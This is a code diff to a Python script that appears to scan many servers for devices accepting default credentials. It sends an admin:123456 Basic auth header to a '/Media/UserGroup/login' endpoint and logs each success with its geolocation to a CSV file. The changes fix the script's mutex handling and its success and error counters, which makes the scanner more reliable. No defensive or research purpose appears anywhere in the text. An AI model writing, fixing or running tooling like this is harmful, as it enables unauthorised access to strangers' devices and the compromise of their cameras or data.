@@ -19,13 +19,13 @@ with open('output.csv', 'w') as f:
 
 def add_mutex(name):
     if not name in mutex_list:
-        mutex_list["name"] = threading.Lock()
+        mutex_list[name] = threading.Lock()
 
     def decorator(function):
         def wrapper(*args, **kwargs):
-            mutex_list["name"].acquire()
+            mutex_list[name].acquire()
             result = function(*args, **kwargs)
-            mutex_list["name"].release()
+            mutex_list[name].release()
             return result
         return wrapper
     return decorator
@@ -37,7 +37,9 @@ def change_thread_count(change):
     threads = threads + change
 
 @add_mutex("print_single")
-def print_single(server):
+def print_single(server, status=False):
+    if status:
+        add_success()
     print(f"[ \033[92m{success} \033[97m| \033[33m{failed} \033[97m| \033[91m{errors} \033[97m] http://\033[96m{server}\033[97m/")
 
 @add_mutex("success")
@@ -52,8 +54,8 @@ def add_failed():
 
 @add_mutex("error")
 def add_error():
-    global success
-    success += 1
+    global errors
+    errors += 1
 
 
 
@@ -74,7 +76,6 @@ def send_login_request(server, source, city, country, country_code, long, lat):
         r = requests.get(f"http://{server}/Media/UserGroup/login?response_format=json", headers={"Authorization": "Basic YWRtaW46MTIzNDU2" }, timeout=10)
 
         if r.status_code == 200:
-            add_success()
 
             count = "N/A"
             try:
@@ -85,7 +86,7 @@ def send_login_request(server, source, city, country, country_code, long, lat):
             except:
                 pass
 
-            print_single(server)
+            print_single(server, True)
             save(server, r.status_code, count, source, city, country, country_code, long, lat)
         else:
             add_failed()
